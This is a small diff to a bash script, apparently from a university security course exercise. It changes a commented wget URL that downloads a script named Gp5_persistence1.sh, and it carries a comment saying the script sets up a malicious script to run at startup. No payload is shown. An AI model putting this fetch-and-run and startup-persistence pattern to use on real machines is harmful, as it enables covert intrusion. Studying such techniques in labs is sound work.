@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# wget https://raw.githubusercontent.com/S692/ossas/main/Gp5_persistence1.sh
+# wget https://raw.githubusercontent.com/S692/ICT3204C1G5/main/Gp5_persistence1.sh
 # chmod +x Gp5_persistence1.sh
 
 # create shell script that runs a malicious script at start up
